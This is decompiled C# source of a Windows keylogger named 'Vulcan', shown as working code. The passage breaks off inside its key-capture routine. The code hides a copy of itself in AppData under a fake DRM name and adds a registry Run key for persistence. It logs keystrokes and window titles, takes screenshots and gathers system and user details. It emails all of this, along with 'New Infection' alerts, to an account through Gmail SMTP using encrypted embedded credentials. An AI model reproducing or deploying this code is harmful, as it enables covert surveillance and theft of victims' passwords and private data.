using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns1;

internal class Form1 : Form
{
	private object object_0;

	private string string_0;

	private object object_1;

	private int int_0;

	private int int_1;

	private object object_2;

	private string string_1;

	private string string_2;

	private MessageBoxIcon messageBoxIcon_0;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private bool bool_0;

	private bool bool_1;

	private bool bool_2;

	private bool bool_3;

	private bool bool_4;

	private bool bool_5;

	private bool bool_6;

	private Bitmap bitmap_0;

	private Graphics graphics_0;

	private IContainer icontainer_0;

	private Timer timer_0;

	private Timer timer_1;

	private TextBox textBox_0;

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		string_0 = null;
		int_1 = 69;
		InitializeComponent();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int int_2);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetKeyState(int int_2);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int int_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, int int_3);

	private string method_0()
	{
		string string_ = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref string_, 100);
		return string_.Substring(0, checked(Strings.InStr(string_, "\0", (CompareMethod)0) - 1));
	}

	[STAThread]
	public static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Form1());
	}

	public static string smethod_0(string string_11, string string_12)
	{
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string_12 = smethod_2(string_12);
		tripleDESCryptoServiceProvider.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_12));
		tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
		icryptoTransform val = ((SymmetricAlgorithm)tripleDESCryptoServiceProvider).Createdecryptor();
		byte[] array = Convert.FromBase64String(string_11);
		return Encoding.ASCII.GetString(val.TransformFinalBlock(array, 0, array.Length));
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		string_3 = smethod_0("2yXIKDKfQXwEmvODFkDJAQ==", Conversions.ToString(987231145));
		string_4 = smethod_0("8eJ5jp8+hC2xpDhOSFcjJ27LineKL7wqhJpvhBKCwcc=", string_3);
		string_7 = smethod_0("OjtY4FmqbkSph6bmFhilF4Sab4QSgsHH", string_3);
		string_8 = smethod_0("J3ZP6fagomY=", string_3);
		string_9 = smethod_0("J3ZP6fagomY=", string_3);
		string_1 = "";
		string_2 = "";
		messageBoxIcon_0 = (MessageBoxIcon)48;
		string_5 = "587";
		string_10 = Conversions.ToString(300000);
		string_6 = "smtp.gmail.com";
		bool_0 = true;
		bool_1 = false;
		bool_2 = false;
		bool_3 = false;
		bool_4 = true;
		bool_5 = true;
		bool_6 = false;
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IndivDRM.exe"))
		{
			if (Operators.CompareString(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Application.get_startuppath(), false) == 0)
			{
				vmethod_0().set_Interval(Conversions.ToInteger(string_10));
				vmethod_2().Start();
				vmethod_0().Start();
			}
		}
		else
		{
			string text = Conversions.ToString(method_6(3, 50000));
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IndivDRM.exe");
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IndivDRM.exe");
			FileAttributes fileAttributes = FileAttributes.Hidden;
			File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IndivDRM.exe", FileAttributes.Hidden);
			if (bool_4)
			{
				string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
				string name2 = "Windows applicaton";
				string value = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IndivDRM.exe";
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
				registryKey.SetValue(name2, value, RegistryValueKind.String);
			}
			if (bool_6)
			{
				MessageBox.Show(string_2, string_1, (MessageBoxButtons)0, messageBoxIcon_0);
			}
			if (bool_2)
			{
				Process.Start(string_8);
			}
			if (bool_1)
			{
				method_5(string_9, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + text + ".exe");
				File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + text + ".exe", fileAttributes);
			}
			if (bool_5)
			{
				File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
			}
			method_3();
		}
		((Control)this).Hide();
	}

	public bool method_1()
	{
		return (GetKeyState(20) & 1) != 0;
	}

	public bool method_2()
	{
		return GetAsyncKeyState(16) != 0;
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		if (Operators.CompareString(vmethod_4().get_Text(), "", false) == 0)
		{
			vmethod_4().set_Text("");
			return;
		}
		try
		{
			string text = Conversions.ToString(method_6(3, 50000));
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(string_4);
			mailMessage.To.Add(string_4);
			mailMessage.Subject = "[Vulcan " + ((ServerComputer)Class2.smethod_0()).get_Name() + "]: Program Is Off Now";
			if (bool_0)
			{
				try
				{
					bitmap_0 = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					graphics_0 = Graphics.FromImage((Image)(object)bitmap_0);
					graphics_0.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					((Image)bitmap_0).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					mailMessage.Attachments.Add(item);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_3)
			{
				mailMessage.Body += Environment.NewLine;
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "IP Addresss: " + method_4().ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "OS Version: " + smethod_1();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Username: " + Environment.UserName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Computer Name: " + Environment.MachineName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "System Root: " + Environment.SystemDirectory.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage.Body += "------------------------------------------------";
				mailMessage.Body += Environment.NewLine;
			}
			mailMessage.Body += vmethod_4().get_Text();
			SmtpClient smtpClient = new SmtpClient(string_6);
			smtpClient.Port = Conversions.ToInteger(string_5);
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(string_4, string_7);
			smtpClient.Send(mailMessage);
			vmethod_4().set_Text("");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void method_3()
	{
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		try
		{
			string text = Conversions.ToString(method_6(3, 50000));
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(string_4);
			mailMessage.To.Add(string_4);
			mailMessage.Subject = "[Vulcan " + ((ServerComputer)Class2.smethod_0()).get_Name() + "]: New Infection";
			if (bool_0)
			{
				try
				{
					bitmap_0 = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					graphics_0 = Graphics.FromImage((Image)(object)bitmap_0);
					graphics_0.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					((Image)bitmap_0).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					mailMessage.Attachments.Add(item);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_3)
			{
				mailMessage.Body += Environment.NewLine;
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "IP Addresss: " + method_4().ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "OS Version: " + smethod_1();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Username: " + Environment.UserName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Computer Name: " + Environment.MachineName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "System Root: " + Environment.SystemDirectory.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage.Body += "------------------------------------------------";
				mailMessage.Body += Environment.NewLine;
			}
			mailMessage.Body += "New Infection!!!";
			SmtpClient smtpClient = new SmtpClient(string_6);
			smtpClient.Port = Conversions.ToInteger(string_5);
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(string_4, string_7);
			smtpClient.Send(mailMessage);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		if (Operators.CompareString(vmethod_4().get_Text(), "", false) == 0)
		{
			vmethod_4().set_Text("");
			return;
		}
		try
		{
			string text = Conversions.ToString(method_6(3, 50000));
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(string_4);
			mailMessage.To.Add(string_4);
			mailMessage.Subject = "[Vulcan " + ((ServerComputer)Class2.smethod_0()).get_Name() + "]: please help me";
			if (bool_0)
			{
				try
				{
					bitmap_0 = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					graphics_0 = Graphics.FromImage((Image)(object)bitmap_0);
					graphics_0.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					((Image)bitmap_0).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					mailMessage.Attachments.Add(item);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_3)
			{
				mailMessage.Body += Environment.NewLine;
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "IP Addresss: " + method_4().ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "OS Version: " + smethod_1();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Username: " + Environment.UserName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Computer Name: " + Environment.MachineName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "System Root: " + Environment.SystemDirectory.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage.Body += "------------------------------------------------";
				mailMessage.Body += Environment.NewLine;
			}
			mailMessage.Body += vmethod_4().get_Text();
			SmtpClient smtpClient = new SmtpClient(string_6);
			smtpClient.Port = Conversions.ToInteger(string_5);
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(string_4, string_7);
			smtpClient.Send(mailMessage);
			vmethod_4().set_Text("");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private unsafe void timer_1_Tick(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		object obj = default(object);
		object obj2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0006_dispatch)
					{
					default:
						*unchecked((int*)((byte*)ptr + 8)) = 1;
						if (Operators.CompareString(string_0, method_0(), false) != 0)
						{
							goto IL_0020;
						}
						goto IL_0061;
					case 7610:
						{
							int num;
							unchecked
							{
								*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
								switch (*(int*)ptr)
								{
								case 1:
									break;
								default:
									goto end_IL_0006;
								}
								num = *(int*)((byte*)ptr + 4) + 1;
								*(int*)((byte*)ptr + 4) = 0;
							}
							switch (num)
							{
							case 1:
								break;
							case 2:
								goto IL_0020;
							case 3:
								goto IL_0050;
							case 4:
							case 5:
								goto IL_0061;
							case 6:
								goto IL_0069;
							case 7:
								goto IL_0080;
							case 8:
								goto IL_009d;
							case 9:
								goto IL_00a9;
							case 11:
							case 12:
								goto IL_00bf;
							case 13:
								goto IL_00d7;
							case 14:
								goto IL_00f5;
							case 15:
								goto IL_0106;
							case 17:
							case 18:
								goto IL_011f;
							case 19:
								goto IL_0136;
							case 20:
								goto IL_0154;
							case 21:
								goto IL_0165;
							case 23:
							case 24:
								goto IL_017e;
							case 25:
								goto IL_0196;
							case 26:
								goto IL_01b4;
							case 29:
							case 30:
								goto IL_01ca;
							case 31:
								goto IL_01e5;
							case 32:
								goto IL_0203;
							case 33:
								goto IL_0211;
							case 35:
								goto IL_0227;
							case 36:
								goto IL_022d;
							case 40:
							case 41:
								goto IL_0243;
							case 42:
								goto IL_025e;
							case 43:
								goto IL_027c;
							case 44:
								goto IL_028a;
							case 46:
								goto IL_02a0;
							case 47:
								goto IL_02a6;
							case 51:
							case 52:
								goto IL_02bc;
							case 53:
								goto IL_02d7;
							case 54:
								goto IL_02f5;
							case 55:
								goto IL_0303;
							case 57:
								goto IL_0319;
							case 58:
								goto IL_031f;
							case 62:
							case 63:
								goto IL_0335;
							case 64:
								goto IL_0350;
							case 65:
								goto IL_036e;
							case 66:
								goto IL_037c;
							case 68:
								goto IL_0392;
							case 69:
								goto IL_0398;
							case 73:
							case 74:
								goto IL_03ae;
							case 75:
								goto IL_03c9;
							case 76:
								goto IL_03e7;
							case 77:
								goto IL_03f5;
							case 79:
								goto IL_040b;
							case 80:
								goto IL_0411;
							case 84:
							case 85:
								goto IL_0427;
							case 86:
								goto IL_0442;
							case 87:
								goto IL_0460;
							case 88:
								goto IL_046e;
							case 90:
								goto IL_0484;
							case 91:
								goto IL_048a;
							case 95:
							case 96:
								goto IL_04a0;
							case 97:
								goto IL_04bb;
							case 98:
								goto IL_04d9;
							case 99:
								goto IL_04e7;
							case 101:
								goto IL_04fd;
							case 102:
								goto IL_0503;
							case 106:
							case 107:
								goto IL_0519;
							case 108:
								goto IL_0531;
							case 109:
								goto IL_054f;
							case 110:
								goto IL_055d;
							case 112:
								goto IL_0573;
							case 113:
								goto IL_0579;
							case 117:
							case 118:
								goto IL_058f;
							case 119:
								goto IL_05a7;
							case 120:
								goto IL_05c5;
							case 121:
								goto IL_05d3;
							case 123:
								goto IL_05e9;
							case 124:
								goto IL_05ef;
							case 128:
							case 129:
								goto IL_0605;
							case 130:
								goto IL_0620;
							case 131:
								goto IL_0641;
							case 132:
								goto IL_0652;
							case 134:
								goto IL_066b;
							case 135:
								goto IL_0674;
							case 139:
							case 140:
								goto IL_068d;
							case 141:
								goto IL_06a8;
							case 142:
								goto IL_06c9;
							case 143:
								goto IL_06da;
							case 145:
								goto IL_06f3;
							case 146:
								goto IL_06fc;
							case 150:
							case 151:
								goto IL_0715;
							case 152:
								goto IL_0730;
							case 153:
								goto IL_0751;
							case 154:
								goto IL_0762;
							case 156:
								goto IL_077b;
							case 157:
								goto IL_0784;
							case 161:
							case 162:
								goto IL_079d;
							case 163:
								goto IL_07b8;
							case 164:
								goto IL_07d9;
							case 165:
								goto IL_07ea;
							case 167:
								goto IL_0803;
							case 168:
								goto IL_080c;
							case 172:
							case 173:
								goto IL_0825;
							case 174:
								goto IL_0840;
							case 175:
								goto IL_0861;
							case 176:
								goto IL_0872;
							case 178:
								goto IL_088b;
							case 179:
								goto IL_0894;
							case 183:
							case 184:
								goto IL_08ad;
							case 185:
								goto IL_08c8;
							case 186:
								goto IL_08e9;
							case 187:
								goto IL_08fa;
							case 189:
								goto IL_0913;
							case 190:
								goto IL_091c;
							case 194:
							case 195:
								goto IL_0935;
							case 196:
								goto IL_0950;
							case 197:
								goto IL_0971;
							case 198:
								goto IL_0982;
							case 200:
								goto IL_099b;
							case 201:
								goto IL_09a4;
							case 205:
							case 206:
								goto IL_09bd;
							case 207:
								goto IL_09d8;
							case 208:
								goto IL_09f9;
							case 209:
								goto IL_0a0a;
							case 211:
								goto IL_0a23;
							case 212:
								goto IL_0a2c;
							case 216:
							case 217:
								goto IL_0a45;
							case 218:
								goto IL_0a60;
							case 219:
								goto IL_0a81;
							case 220:
								goto IL_0a92;
							case 221:
								goto IL_0aa6;
							case 223:
								goto IL_0ac2;
							case 224:
								goto IL_0acb;
							case 227:
							case 228:
								goto IL_0ae4;
							case 229:
								goto IL_0aff;
							case 230:
								goto IL_0b20;
							case 231:
								goto IL_0b31;
							case 233:
								goto IL_0b4a;
							case 234:
								goto IL_0b53;
							case 238:
							case 239:
								goto IL_0b6c;
							case 240:
								goto IL_0b87;
							case 241:
								goto IL_0ba8;
							case 243:
							case 244:
								goto IL_0bc1;
							case 245:
								goto IL_0bdc;
							case 246:
								goto IL_0bfd;
							case 247:
								goto IL_0c0e;
							case 249:
								goto IL_0c27;
							case 250:
								goto IL_0c30;
							case 254:
							case 255:
								goto IL_0c49;
							case 256:
								goto IL_0c64;
							case 257:
								goto IL_0c85;
							case 258:
								goto IL_0c96;
							case 260:
								goto IL_0caf;
							case 261:
								goto IL_0cb8;
							case 265:
							case 266:
								goto IL_0cd1;
							case 267:
								goto IL_0cec;
							case 268:
								goto IL_0d0d;
							case 271:
							case 272:
								goto IL_0d26;
							case 273:
								goto IL_0d40;
							case 274:
								goto IL_0d61;
							case 275:
								goto IL_0d72;
							case 277:
								goto IL_0d8b;
							case 278:
								goto IL_0d94;
							case 282:
							case 283:
								goto IL_0dad;
							case 284:
								goto IL_0dcb;
							case 285:
								goto IL_0dec;
							case 286:
								goto IL_0dfd;
							case 288:
								goto IL_0e16;
							case 289:
								goto IL_0e1f;
							case 293:
							case 294:
								goto IL_0e38;
							case 295:
								goto IL_0e56;
							case 296:
								goto IL_0e77;
							case 297:
								goto IL_0e88;
							case 299:
								goto IL_0ea1;
							case 300:
								goto IL_0eaa;
							case 304:
							case 305:
								goto IL_0ec5;
							case 306:
								goto IL_0ee3;
							case 307:
								goto IL_0f04;
							case 308:
								goto IL_0f15;
							case 310:
								goto IL_0f2e;
							case 311:
								goto IL_0f37;
							case 315:
							case 316:
								goto IL_0f50;
							case 317:
								goto IL_0f6e;
							case 318:
								goto IL_0f8f;
							case 319:
								goto IL_0fa0;
							case 321:
								goto IL_0fb9;
							case 322:
								goto IL_0fc2;
							case 326:
							case 327:
								goto IL_0fdb;
							case 328:
								goto IL_1010;
							case 329:
								goto IL_1034;
							case 370:
							case 371:
								goto IL_1055;
							case 330:
								goto IL_1077;
							case 331:
								goto IL_108b;
							case 361:
							case 362:
								goto IL_10db;
							case 333:
							case 335:
								goto IL_10f4;
							case 337:
							case 338:
								goto IL_110d;
							case 340:
							case 341:
								goto IL_1126;
							case 343:
							case 344:
								goto IL_113f;
							case 346:
							case 347:
								goto IL_1158;
							case 349:
							case 350:
								goto IL_1171;
							case 352:
							case 353:
								goto IL_118a;
							case 355:
							case 356:
								goto IL_11a3;
							case 358:
							case 359:
								goto IL_11bc;
							case 365:
								goto IL_11d5;
							case 366:
								goto IL_11de;
							case 372:
								goto IL_1207;
							case 373:
								goto IL_123f;
							case 374:
								goto IL_1263;
							case 393:
							case 394:
								goto IL_1284;
							case 375:
								goto IL_12a6;
							case 376:
								goto IL_12b7;
							case 377:
								goto IL_12c8;
							case 379:
								goto IL_12f6;
							case 380:
								goto IL_12ff;
							case 383:
								goto IL_132a;
							case 384:
								goto IL_1333;
							case 385:
								goto IL_1344;
							case 387:
								goto IL_136f;
							case 388:
								goto IL_1378;
							case 10:
							case 16:
							case 22:
							case 27:
							case 34:
							case 37:
							case 38:
							case 45:
							case 48:
							case 49:
							case 56:
							case 59:
							case 60:
							case 67:
							case 70:
							case 71:
							case 78:
							case 81:
							case 82:
							case 89:
							case 92:
							case 93:
							case 100:
							case 103:
							case 104:
							case 111:
							case 114:
							case 115:
							case 122:
							case 125:
							case 126:
							case 133:
							case 136:
							case 137:
							case 144:
							case 147:
							case 148:
							case 155:
							case 158:
							case 159:
							case 166:
							case 169:
							case 170:
							case 177:
							case 180:
							case 181:
							case 188:
							case 191:
							case 192:
							case 199:
							case 202:
							case 203:
							case 210:
							case 213:
							case 214:
							case 222:
							case 225:
							case 226:
							case 232:
							case 235:
							case 236:
							case 242:
							case 248:
							case 251:
							case 252:
							case 259:
							case 262:
							case 263:
							case 269:
							case 276:
							case 279:
							case 280:
							case 287:
							case 290:
							case 291:
							case 298:
							case 301:
							case 302:
							case 309:
							case 312:
							case 313:
							case 320:
							case 323:
							case 324:
							case 332:
							case 336:
							case 339:
							case 342:
							case 345:
							case 348:
							case 351:
							case 354:
							case 357:
							case 360:
							case 363:
							case 364:
							case 367:
							case 368:
							case 378:
							case 381:
							case 382:
							case 386:
							case 389:
							case 390:
							case 391:
							case 397:
								goto IL_13a1;
							case 398:
								goto IL_13b8;
							case 399:
								goto IL_13c8;
							case 400:
							case 401:
								goto IL_13e1;
							case 402:
								goto IL_13fd;
							case 403:
							case 404:
								goto IL_141c;
							case 395:
								goto end_IL_0006_2;
							case 28:
								*unchecked((int*)((byte*)ptr + 8)) = 28;
								int_0++;
								goto IL_01ca;
							case 39:
								*unchecked((int*)((byte*)ptr + 8)) = 39;
								int_0++;
								goto IL_0243;
							case 50:
								*unchecked((int*)((byte*)ptr + 8)) = 50;
								int_0++;
								goto IL_02bc;
							case 61:
								*unchecked((int*)((byte*)ptr + 8)) = 61;
								int_0++;
								goto IL_0335;
							case 72:
								*unchecked((int*)((byte*)ptr + 8)) = 72;
								int_0++;
								goto IL_03ae;
							case 83:
								*unchecked((int*)((byte*)ptr + 8)) = 83;
								int_0++;
								goto IL_0427;
							case 94:
								*unchecked((int*)((byte*)ptr + 8)) = 94;
								int_0++;
								goto IL_04a0;
							case 105:
								*unchecked((int*)((byte*)ptr + 8)) = 105;
								int_0++;
								goto IL_0519;
							case 116:
								*unchecked((int*)((byte*)ptr + 8)) = 116;
								int_0++;
								goto IL_058f;
							case 127:
								*unchecked((int*)((byte*)ptr + 8)) = 127;
								int_0++;
								goto IL_0605;
							case 138:
								*unchecked((int*)((byte*)ptr + 8)) = 138;
								int_0++;
								goto IL_068d;
							case 149:
								*unchecked((int*)((byte*)ptr + 8)) = 149;
								int_0++;
								goto IL_0715;
							case 160:
								*unchecked((int*)((byte*)ptr + 8)) = 160;
								int_0++;
								goto IL_079d;
							case 171:
								*unchecked((int*)((byte*)ptr + 8)) = 171;
								int_0++;
								goto IL_0825;
							case 182:
								*unchecked((int*)((byte*)ptr + 8)) = 182;
								int_0++;
								goto IL_08ad;
							case 193:
								*unchecked((int*)((byte*)ptr + 8)) = 193;
								int_0++;
								goto IL_0935;
							case 204:
								*unchecked((int*)((byte*)ptr + 8)) = 204;
								int_0++;
								goto IL_09bd;
							case 215:
								*unchecked((int*)((byte*)ptr + 8)) = 215;
								int_0++;
								goto IL_0a45;
							case 237:
								*unchecked((int*)((byte*)ptr + 8)) = 237;
								int_0++;
								goto IL_0b6c;
							case 253:
								*unchecked((int*)((byte*)ptr + 8)) = 253;
								int_0++;
								goto IL_0c49;
							case 264:
								*unchecked((int*)((byte*)ptr + 8)) = 264;
								int_0++;
								goto IL_0cd1;
							case 270:
								*unchecked((int*)((byte*)ptr + 8)) = 270;
								int_0++;
								goto IL_0d26;
							case 281:
								*unchecked((int*)((byte*)ptr + 8)) = 281;
								int_0++;
								goto IL_0dad;
							case 292:
								*unchecked((int*)((byte*)ptr + 8)) = 292;
								int_0++;
								goto IL_0e38;
							case 303:
								*unchecked((int*)((byte*)ptr + 8)) = 303;
								int_0++;
								goto IL_0ec5;
							case 314:
								*unchecked((int*)((byte*)ptr + 8)) = 314;
								int_0++;
								goto IL_0f50;
							case 325:
								*unchecked((int*)((byte*)ptr + 8)) = 325;
								int_0++;
								goto IL_0fdb;
							case 369:
								*unchecked((int*)((byte*)ptr + 8)) = 369;
								int_0++;
								goto IL_1055;
							case 392:
								*unchecked((int*)((byte*)ptr + 8)) = 392;
								int_0++;
								goto IL_1284;
							default:
								goto end_IL_0006;
							case 396:
							case 405:
								goto end_IL_0006_3;
							}
							goto default;
						}
						IL_141c:
						*unchecked((int*)((byte*)ptr + 8)) = 404;
						Application.DoEvents();
						goto end_IL_0006_3;
						IL_0020:
						*unchecked((int*)((byte*)ptr + 8)) = 2;
						vmethod_4().set_Text(vmethod_4().get_Text() + "\r\n[" + method_0() + "]\r\n");
						goto IL_0050;
						IL_0050:
						*unchecked((int*)((byte*)ptr + 8)) = 3;
						string_0 = method_0();
						goto IL_0061;
						IL_0061:
						ProjectData.ClearProjectError();
						*unchecked((int*)ptr) = 1;
						goto IL_0069;
						IL_0069:
						*unchecked((int*)((byte*)ptr + 8)) = 6;
						object_1 = GetAsyncKeyState(13);
						goto IL_0080;
						IL_0080:
						*unchecked((int*)((byte*)ptr + 8)) = 7;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_009d;
						}
						goto IL_00bf;
						IL_009d:
						*unchecked((int*)((byte*)ptr + 8)) = 8;
						int_0 = 0;
						goto IL_00a9;
						IL_00a9:
						*unchecked((int*)((byte*)ptr + 8)) = 9;
						object_2 = "\r\n";
						goto IL_13a1;
						IL_00bf:
						*unchecked((int*)((byte*)ptr + 8)) = 12;
						object_1 = GetAsyncKeyState(17);
						goto IL_00d7;
						IL_00d7:
						*unchecked((int*)((byte*)ptr + 8)) = 13;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_00f5;
						}
						goto IL_011f;
						IL_00f5:
						*unchecked((int*)((byte*)ptr + 8)) = 14;
						object_2 = "[Ctrl]";
						goto IL_0106;
						IL_0106:
						*unchecked((int*)((byte*)ptr + 8)) = 15;
						int_0 += 4;
						goto IL_13a1;
						IL_011f:
						*unchecked((int*)((byte*)ptr + 8)) = 18;
						object_1 = GetAsyncKeyState(8);
						goto IL_0136;
						IL_0136:
						*unchecked((int*)((byte*)ptr + 8)) = 19;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0154;
